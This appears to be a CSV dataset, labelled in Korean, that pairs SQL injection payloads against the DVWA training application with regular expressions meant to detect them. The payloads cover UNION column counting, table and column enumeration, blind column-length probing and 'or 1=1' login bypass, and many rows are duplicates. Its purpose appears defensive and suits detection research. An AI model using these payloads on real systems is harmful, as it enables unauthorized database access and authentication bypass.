injection,공격 유형,설명,탐지 정규식
1' and (select 1 from information_schema.columns where table_schema='dvwa' and table_name='guestbook' and length(column_name)=1) #,UNION 기반 정보 검색,컬럼의 길이를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?and\\s\\(select\\s\\d\\sfrom\\sinformation_schema\\.columns\\swhere\\stable_schema\\=\\'(.*)\\'(\\sand\\stable_name\\=\\'(.*)\\')*?(\\sand\\slength\\(column_name\\)\\=\\d)*?"", re.IGNORECASE)"
"44' union select 1, 2, 3, 4, 5, 6, 7, 8 #",UNION 기반 정보 검색,Column 수를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d+\\s*?\\,\\s*?)*\\d+\\s*?(#)"", re.IGNORECASE)"
42' or 1=1 #,논리적 조건 조작,논리적 조건을 항상 참으로 만들어 인증 우회,"re.compile(""(\\d)*?'\\s*?or\\s(1=1|true|\\'\\d*\\'=\\'\\d*\\')"", re.IGNORECASE)"
"' union select 1, table_name from information_schema.tables #",UNION 기반 정보 검색,table_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?table_name\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?from\\sinformation_schema\\.tables\\s(where\\stable_schema\\s*?\\=\\s*?\\'(.*)\\')*?"", re.IGNORECASE)"
"13' union select 1, 2 #",UNION 기반 정보 검색,Column 수를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d+\\s*?\\,\\s*?)*\\d+\\s*?(#)"", re.IGNORECASE)"
"' union select 1,database() #",UNION 기반 정보 검색,현재 사용 중인 데이터베이스의 이름을 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?database\\(\\)"", re.IGNORECASE)"
"26' union select 1, 2, 3, 4, 5, 6 #",UNION 기반 정보 검색,Column 수를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d+\\s*?\\,\\s*?)*\\d+\\s*?(#)"", re.IGNORECASE)"
1' and (select 1 from information_schema.columns where table_schema='dvwa' and table_name='users' and length(column_name)=2) #,UNION 기반 정보 검색,컬럼의 길이를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?and\\s\\(select\\s\\d\\sfrom\\sinformation_schema\\.columns\\swhere\\stable_schema\\=\\'(.*)\\'(\\sand\\stable_name\\=\\'(.*)\\')*?(\\sand\\slength\\(column_name\\)\\=\\d)*?"", re.IGNORECASE)"
1' and (select 1 from information_schema.columns where table_schema='dvwa' and table_name='users' and length(column_name)=7) #,UNION 기반 정보 검색,컬럼의 길이를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?and\\s\\(select\\s\\d\\sfrom\\sinformation_schema\\.columns\\swhere\\stable_schema\\=\\'(.*)\\'(\\sand\\stable_name\\=\\'(.*)\\')*?(\\sand\\slength\\(column_name\\)\\=\\d)*?"", re.IGNORECASE)"
1' and (select 1 from information_schema.columns where table_schema='dvwa' and table_name='users' and length(column_name)=9) #,UNION 기반 정보 검색,컬럼의 길이를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?and\\s\\(select\\s\\d\\sfrom\\sinformation_schema\\.columns\\swhere\\stable_schema\\=\\'(.*)\\'(\\sand\\stable_name\\=\\'(.*)\\')*?(\\sand\\slength\\(column_name\\)\\=\\d)*?"", re.IGNORECASE)"
1' and (select 1 from information_schema.columns where table_schema='dvwa' and table_name='users' and length(column_name)=6) #,UNION 기반 정보 검색,컬럼의 길이를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?and\\s\\(select\\s\\d\\sfrom\\sinformation_schema\\.columns\\swhere\\stable_schema\\=\\'(.*)\\'(\\sand\\stable_name\\=\\'(.*)\\')*?(\\sand\\slength\\(column_name\\)\\=\\d)*?"", re.IGNORECASE)"
"20' union select 1,column_name from information_schema.columns where table_name='users' #",UNION 기반 정보 검색,column_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?column_name"", re.IGNORECASE)"
"20' union select 1,column_name from information_schema.columns where table_name='users' and table_schema='dvwa' #",UNION 기반 정보 검색,column_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?column_name"", re.IGNORECASE)"
' or '1'='1' limit 1 #,논리적 조건 조작,논리적 조건을 항상 참으로 만들어 인증 우회,"re.compile(""(\\d)*?'\\s*?or\\s(1=1|true|\\'\\d*\\'=\\'\\d*\\')"", re.IGNORECASE)"
"36' union select 1, 2, 3 #",UNION 기반 정보 검색,Column 수를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d+\\s*?\\,\\s*?)*\\d+\\s*?(#)"", re.IGNORECASE)"
"7' union select 1, table_name from information_schema.tables #",UNION 기반 정보 검색,table_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?table_name\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?from\\sinformation_schema\\.tables\\s(where\\stable_schema\\s*?\\=\\s*?\\'(.*)\\')*?"", re.IGNORECASE)"
"76' union select 1,column_name from information_schema.columns where table_name='guestbook' #",UNION 기반 정보 검색,column_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?column_name"", re.IGNORECASE)"
"54' union select 1,column_name from information_schema.columns where table_name='guestbook' and table_schema='dvwa' #",UNION 기반 정보 검색,column_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?column_name"", re.IGNORECASE)"
"' union select 1, 2, 3, 4, 5, 6 #",UNION 기반 정보 검색,Column 수를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d+\\s*?\\,\\s*?)*\\d+\\s*?(#)"", re.IGNORECASE)"
88' or '1'='1' #,논리적 조건 조작,논리적 조건을 항상 참으로 만들어 인증 우회,"re.compile(""(\\d)*?'\\s*?or\\s(1=1|true|\\'\\d*\\'=\\'\\d*\\')"", re.IGNORECASE)"
"' union select 1, 2, 3, 4, 5, 6, 7 #",UNION 기반 정보 검색,Column 수를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d+\\s*?\\,\\s*?)*\\d+\\s*?(#)"", re.IGNORECASE)"
"62' union select 1, 2, 3, 4, 5 #",UNION 기반 정보 검색,Column 수를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d+\\s*?\\,\\s*?)*\\d+\\s*?(#)"", re.IGNORECASE)"
"30' union select 1, 2, 3, 4, 5, 6 #",UNION 기반 정보 검색,Column 수를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d+\\s*?\\,\\s*?)*\\d+\\s*?(#)"", re.IGNORECASE)"
"' union select 1,column_name from information_schema.columns where table_name='guestbook' limit 2,1 #",UNION 기반 정보 검색,column_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?column_name"", re.IGNORECASE)"
' union select 1 #,UNION 기반 정보 검색,Column 수를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d+\\s*?\\,\\s*?)*\\d+\\s*?(#)"", re.IGNORECASE)"
"42' union select 1,column_name from information_schema.columns where table_name='users' limit 3,1 #",UNION 기반 정보 검색,column_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?column_name"", re.IGNORECASE)"
1' and (select 1 from information_schema.columns where table_schema='dvwa' and table_name='users' and length(column_name)=7) #,UNION 기반 정보 검색,컬럼의 길이를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?and\\s\\(select\\s\\d\\sfrom\\sinformation_schema\\.columns\\swhere\\stable_schema\\=\\'(.*)\\'(\\sand\\stable_name\\=\\'(.*)\\')*?(\\sand\\slength\\(column_name\\)\\=\\d)*?"", re.IGNORECASE)"
1' and (select 1 from information_schema.columns where table_schema='dvwa' and table_name='users' and length(column_name)=4) #,UNION 기반 정보 검색,컬럼의 길이를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?and\\s\\(select\\s\\d\\sfrom\\sinformation_schema\\.columns\\swhere\\stable_schema\\=\\'(.*)\\'(\\sand\\stable_name\\=\\'(.*)\\')*?(\\sand\\slength\\(column_name\\)\\=\\d)*?"", re.IGNORECASE)"
"62' union select 1, 2, 3, 4, 5 #",UNION 기반 정보 검색,Column 수를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d+\\s*?\\,\\s*?)*\\d+\\s*?(#)"", re.IGNORECASE)"
"48' union select 1,column_name from information_schema.columns where table_name='guestbook' #",UNION 기반 정보 검색,column_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?column_name"", re.IGNORECASE)"
"66' union select 1, 2, 3, 4 #",UNION 기반 정보 검색,Column 수를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d+\\s*?\\,\\s*?)*\\d+\\s*?(#)"", re.IGNORECASE)"
"' union select 1, 2, 3, 4 #",UNION 기반 정보 검색,Column 수를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d+\\s*?\\,\\s*?)*\\d+\\s*?(#)"", re.IGNORECASE)"
64' or 1=1 limit 5 #,논리적 조건 조작,논리적 조건을 항상 참으로 만들어 인증 우회,"re.compile(""(\\d)*?'\\s*?or\\s(1=1|true|\\'\\d*\\'=\\'\\d*\\')"", re.IGNORECASE)"
"76' union select 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 #",UNION 기반 정보 검색,Column 수를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d+\\s*?\\,\\s*?)*\\d+\\s*?(#)"", re.IGNORECASE)"
"13' union select 1, 2 #",UNION 기반 정보 검색,Column 수를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d+\\s*?\\,\\s*?)*\\d+\\s*?(#)"", re.IGNORECASE)"
"73' union select 1, 2, 3, 4 #",UNION 기반 정보 검색,Column 수를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d+\\s*?\\,\\s*?)*\\d+\\s*?(#)"", re.IGNORECASE)"
"84' union select 1,table_name from information_schema.tables where table_schema='dvwa' #",UNION 기반 정보 검색,table_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?table_name\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?from\\sinformation_schema\\.tables\\s(where\\stable_schema\\s*?\\=\\s*?\\'(.*)\\')*?"", re.IGNORECASE)"
"30' union select 1,column_name from information_schema.columns where table_name='users' limit 3,1 #",UNION 기반 정보 검색,column_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?column_name"", re.IGNORECASE)"
"64' union select 1, 2, 3 #",UNION 기반 정보 검색,Column 수를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d+\\s*?\\,\\s*?)*\\d+\\s*?(#)"", re.IGNORECASE)"
"' union select 1, 2 #",UNION 기반 정보 검색,Column 수를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d+\\s*?\\,\\s*?)*\\d+\\s*?(#)"", re.IGNORECASE)"
"20' union select 1, 2, 3 #",UNION 기반 정보 검색,Column 수를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d+\\s*?\\,\\s*?)*\\d+\\s*?(#)"", re.IGNORECASE)"
"72' union select 1,column_name from information_schema.columns where table_name='guestbook' #",UNION 기반 정보 검색,column_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?column_name"", re.IGNORECASE)"
46' or '1'='1' #,논리적 조건 조작,논리적 조건을 항상 참으로 만들어 인증 우회,"re.compile(""(\\d)*?'\\s*?or\\s(1=1|true|\\'\\d*\\'=\\'\\d*\\')"", re.IGNORECASE)"
"32' union select 1, 2, 3, 4, 5, 6, 7 #",UNION 기반 정보 검색,Column 수를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d+\\s*?\\,\\s*?)*\\d+\\s*?(#)"", re.IGNORECASE)"
"84' union select 1,table_name from information_schema.tables where table_schema='dvwa' #",UNION 기반 정보 검색,table_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?table_name\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?from\\sinformation_schema\\.tables\\s(where\\stable_schema\\s*?\\=\\s*?\\'(.*)\\')*?"", re.IGNORECASE)"
4' or true #,논리적 조건 조작,논리적 조건을 항상 참으로 만들어 인증 우회,"re.compile(""(\\d)*?'\\s*?or\\s(1=1|true|\\'\\d*\\'=\\'\\d*\\')"", re.IGNORECASE)"
65' or true #,논리적 조건 조작,논리적 조건을 항상 참으로 만들어 인증 우회,"re.compile(""(\\d)*?'\\s*?or\\s(1=1|true|\\'\\d*\\'=\\'\\d*\\')"", re.IGNORECASE)"
1' and (select 1 from information_schema.columns where table_schema='dvwa' and table_name='guestbook' and length(column_name)=3) #,UNION 기반 정보 검색,컬럼의 길이를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?and\\s\\(select\\s\\d\\sfrom\\sinformation_schema\\.columns\\swhere\\stable_schema\\=\\'(.*)\\'(\\sand\\stable_name\\=\\'(.*)\\')*?(\\sand\\slength\\(column_name\\)\\=\\d)*?"", re.IGNORECASE)"
"20' union select 1,column_name from information_schema.columns where table_name='users' and table_schema='dvwa' limit 2,1 #",UNION 기반 정보 검색,column_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?column_name"", re.IGNORECASE)"
"74' union select 1,column_name from information_schema.columns where table_name='users' #",UNION 기반 정보 검색,column_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?column_name"", re.IGNORECASE)"
"20' union select 1,column_name from information_schema.columns where table_name='users' and table_schema='dvwa' limit 2,1 #",UNION 기반 정보 검색,column_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?column_name"", re.IGNORECASE)"
"32' union select 1, 2, 3, 4, 5, 6, 7 #",UNION 기반 정보 검색,Column 수를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d+\\s*?\\,\\s*?)*\\d+\\s*?(#)"", re.IGNORECASE)"
"33' union select 1,column_name from information_schema.columns where table_name='users' limit 3,1 #",UNION 기반 정보 검색,column_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?column_name"", re.IGNORECASE)"
1' and (select 1 from information_schema.columns where table_schema='dvwa' and table_name='users' and length(column_name)=2) #,UNION 기반 정보 검색,컬럼의 길이를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?and\\s\\(select\\s\\d\\sfrom\\sinformation_schema\\.columns\\swhere\\stable_schema\\=\\'(.*)\\'(\\sand\\stable_name\\=\\'(.*)\\')*?(\\sand\\slength\\(column_name\\)\\=\\d)*?"", re.IGNORECASE)"
"77' union select 1,column_name from information_schema.columns where table_name='users' and table_schema='dvwa' limit 2,1 #",UNION 기반 정보 검색,column_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?column_name"", re.IGNORECASE)"
"20' union select 1,column_name from information_schema.columns where table_name='users' #",UNION 기반 정보 검색,column_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?column_name"", re.IGNORECASE)"
23' or '1'='1' limit 1 #,논리적 조건 조작,논리적 조건을 항상 참으로 만들어 인증 우회,"re.compile(""(\\d)*?'\\s*?or\\s(1=1|true|\\'\\d*\\'=\\'\\d*\\')"", re.IGNORECASE)"
42' or 1=1 #,논리적 조건 조작,논리적 조건을 항상 참으로 만들어 인증 우회,"re.compile(""(\\d)*?'\\s*?or\\s(1=1|true|\\'\\d*\\'=\\'\\d*\\')"", re.IGNORECASE)"
"' union select database(), 2 #",UNION 기반 정보 검색,현재 사용 중인 데이터베이스의 이름을 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?database\\(\\)"", re.IGNORECASE)"
4' or true #,논리적 조건 조작,논리적 조건을 항상 참으로 만들어 인증 우회,"re.compile(""(\\d)*?'\\s*?or\\s(1=1|true|\\'\\d*\\'=\\'\\d*\\')"", re.IGNORECASE)"
"' union select 1,column_name from information_schema.columns where table_name='guestbook' #",UNION 기반 정보 검색,column_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?column_name"", re.IGNORECASE)"
1' and (select 1 from information_schema.columns where table_schema='dvwa' and table_name='users' and length(column_name)=2) #,UNION 기반 정보 검색,컬럼의 길이를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?and\\s\\(select\\s\\d\\sfrom\\sinformation_schema\\.columns\\swhere\\stable_schema\\=\\'(.*)\\'(\\sand\\stable_name\\=\\'(.*)\\')*?(\\sand\\slength\\(column_name\\)\\=\\d)*?"", re.IGNORECASE)"
"' union select 1,column_name from information_schema.columns where table_name='guestbook' limit 2,1 #",UNION 기반 정보 검색,column_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?column_name"", re.IGNORECASE)"
1' and (select 1 from information_schema.columns where table_schema='dvwa' and table_name='users' and length(column_name)=6) #,UNION 기반 정보 검색,컬럼의 길이를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?and\\s\\(select\\s\\d\\sfrom\\sinformation_schema\\.columns\\swhere\\stable_schema\\=\\'(.*)\\'(\\sand\\stable_name\\=\\'(.*)\\')*?(\\sand\\slength\\(column_name\\)\\=\\d)*?"", re.IGNORECASE)"
"37' union select 1, 2, 3, 4, 5, 6, 7 #",UNION 기반 정보 검색,Column 수를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d+\\s*?\\,\\s*?)*\\d+\\s*?(#)"", re.IGNORECASE)"
1' and (select 1 from information_schema.columns where table_schema='dvwa' and table_name='guestbook' and length(column_name)=8) #,UNION 기반 정보 검색,컬럼의 길이를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?and\\s\\(select\\s\\d\\sfrom\\sinformation_schema\\.columns\\swhere\\stable_schema\\=\\'(.*)\\'(\\sand\\stable_name\\=\\'(.*)\\')*?(\\sand\\slength\\(column_name\\)\\=\\d)*?"", re.IGNORECASE)"
"' union select 1,column_name from information_schema.columns where table_name='guestbook' and table_schema='dvwa' #",UNION 기반 정보 검색,column_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?column_name"", re.IGNORECASE)"
"96' union select 1, 2 #",UNION 기반 정보 검색,Column 수를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d+\\s*?\\,\\s*?)*\\d+\\s*?(#)"", re.IGNORECASE)"
"61' union select 1,column_name from information_schema.columns where table_name='guestbook' limit 2,1 #",UNION 기반 정보 검색,column_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?column_name"", re.IGNORECASE)"
"26' union select 1, 2, 3, 4, 5, 6 #",UNION 기반 정보 검색,Column 수를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d+\\s*?\\,\\s*?)*\\d+\\s*?(#)"", re.IGNORECASE)"
28' or '1'='1' limit 1 #,논리적 조건 조작,논리적 조건을 항상 참으로 만들어 인증 우회,"re.compile(""(\\d)*?'\\s*?or\\s(1=1|true|\\'\\d*\\'=\\'\\d*\\')"", re.IGNORECASE)"
"45' union select 1, 2, 3, 4 #",UNION 기반 정보 검색,Column 수를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d+\\s*?\\,\\s*?)*\\d+\\s*?(#)"", re.IGNORECASE)"
"98' union select 1, table_name from information_schema.tables #",UNION 기반 정보 검색,table_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?table_name\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?from\\sinformation_schema\\.tables\\s(where\\stable_schema\\s*?\\=\\s*?\\'(.*)\\')*?"", re.IGNORECASE)"
"38' union select 1,column_name from information_schema.columns where table_name='users' and table_schema='dvwa' limit 2,1 #",UNION 기반 정보 검색,column_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?column_name"", re.IGNORECASE)"
"' union select 1,column_name from information_schema.columns where table_name='guestbook' #",UNION 기반 정보 검색,column_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?column_name"", re.IGNORECASE)"
"66' union select 1, 2, 3, 4, 5, 6 #",UNION 기반 정보 검색,Column 수를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d+\\s*?\\,\\s*?)*\\d+\\s*?(#)"", re.IGNORECASE)"
1' and (select 1 from information_schema.columns where table_schema='dvwa' and table_name='users' and length(column_name)=6) #,UNION 기반 정보 검색,컬럼의 길이를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?and\\s\\(select\\s\\d\\sfrom\\sinformation_schema\\.columns\\swhere\\stable_schema\\=\\'(.*)\\'(\\sand\\stable_name\\=\\'(.*)\\')*?(\\sand\\slength\\(column_name\\)\\=\\d)*?"", re.IGNORECASE)"
"37' union select 1, table_name from information_schema.tables #",UNION 기반 정보 검색,table_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?table_name\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?from\\sinformation_schema\\.tables\\s(where\\stable_schema\\s*?\\=\\s*?\\'(.*)\\')*?"", re.IGNORECASE)"
10' or true #,논리적 조건 조작,논리적 조건을 항상 참으로 만들어 인증 우회,"re.compile(""(\\d)*?'\\s*?or\\s(1=1|true|\\'\\d*\\'=\\'\\d*\\')"", re.IGNORECASE)"
"37' union select 1,column_name from information_schema.columns where table_name='users' and table_schema='dvwa' limit 2,1 #",UNION 기반 정보 검색,column_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?column_name"", re.IGNORECASE)"
"20' union select 1, 2, 3 #",UNION 기반 정보 검색,Column 수를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d+\\s*?\\,\\s*?)*\\d+\\s*?(#)"", re.IGNORECASE)"
"54' union select 1,column_name from information_schema.columns where table_name='guestbook' and table_schema='dvwa' #",UNION 기반 정보 검색,column_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?column_name"", re.IGNORECASE)"
"30' union select 1, 2, 3, 4, 5, 6 #",UNION 기반 정보 검색,Column 수를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d+\\s*?\\,\\s*?)*\\d+\\s*?(#)"", re.IGNORECASE)"
"67' union select 1,table_name from information_schema.tables where table_schema='dvwa' #",UNION 기반 정보 검색,table_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?table_name\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?from\\sinformation_schema\\.tables\\s(where\\stable_schema\\s*?\\=\\s*?\\'(.*)\\')*?"", re.IGNORECASE)"
"64' union select 1, 2, 3 #",UNION 기반 정보 검색,Column 수를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d+\\s*?\\,\\s*?)*\\d+\\s*?(#)"", re.IGNORECASE)"
68' or '1'='1' limit 1 #,논리적 조건 조작,논리적 조건을 항상 참으로 만들어 인증 우회,"re.compile(""(\\d)*?'\\s*?or\\s(1=1|true|\\'\\d*\\'=\\'\\d*\\')"", re.IGNORECASE)"
1' and (select 1 from information_schema.columns where table_schema='dvwa' and table_name='users' and length(column_name)=8) #,UNION 기반 정보 검색,컬럼의 길이를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?and\\s\\(select\\s\\d\\sfrom\\sinformation_schema\\.columns\\swhere\\stable_schema\\=\\'(.*)\\'(\\sand\\stable_name\\=\\'(.*)\\')*?(\\sand\\slength\\(column_name\\)\\=\\d)*?"", re.IGNORECASE)"
1' and (select 1 from information_schema.columns where table_schema='dvwa' and table_name='guestbook' and length(column_name)=2) #,UNION 기반 정보 검색,컬럼의 길이를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?and\\s\\(select\\s\\d\\sfrom\\sinformation_schema\\.columns\\swhere\\stable_schema\\=\\'(.*)\\'(\\sand\\stable_name\\=\\'(.*)\\')*?(\\sand\\slength\\(column_name\\)\\=\\d)*?"", re.IGNORECASE)"
"33' union select 1,column_name from information_schema.columns where table_name='users' #",UNION 기반 정보 검색,column_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?column_name"", re.IGNORECASE)"
1' and (select 1 from information_schema.columns where table_schema='dvwa' and table_name='users' and length(column_name)=3) #,UNION 기반 정보 검색,컬럼의 길이를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?and\\s\\(select\\s\\d\\sfrom\\sinformation_schema\\.columns\\swhere\\stable_schema\\=\\'(.*)\\'(\\sand\\stable_name\\=\\'(.*)\\')*?(\\sand\\slength\\(column_name\\)\\=\\d)*?"", re.IGNORECASE)"
"' union select 1, 2, 3 #",UNION 기반 정보 검색,Column 수를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d+\\s*?\\,\\s*?)*\\d+\\s*?(#)"", re.IGNORECASE)"
4' or true #,논리적 조건 조작,논리적 조건을 항상 참으로 만들어 인증 우회,"re.compile(""(\\d)*?'\\s*?or\\s(1=1|true|\\'\\d*\\'=\\'\\d*\\')"", re.IGNORECASE)"
1' and (select 1 from information_schema.columns where table_schema='dvwa' and table_name='guestbook' and length(column_name)=7) #,UNION 기반 정보 검색,컬럼의 길이를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?and\\s\\(select\\s\\d\\sfrom\\sinformation_schema\\.columns\\swhere\\stable_schema\\=\\'(.*)\\'(\\sand\\stable_name\\=\\'(.*)\\')*?(\\sand\\slength\\(column_name\\)\\=\\d)*?"", re.IGNORECASE)"
"' union select 1, 2 #",UNION 기반 정보 검색,Column 수를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d+\\s*?\\,\\s*?)*\\d+\\s*?(#)"", re.IGNORECASE)"
"56' union select 1, table_name from information_schema.tables #",UNION 기반 정보 검색,table_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?table_name\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?from\\sinformation_schema\\.tables\\s(where\\stable_schema\\s*?\\=\\s*?\\'(.*)\\')*?"", re.IGNORECASE)"
"98' union select 1, 2, 3, 4, 5, 6 #",UNION 기반 정보 검색,Column 수를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d+\\s*?\\,\\s*?)*\\d+\\s*?(#)"", re.IGNORECASE)"
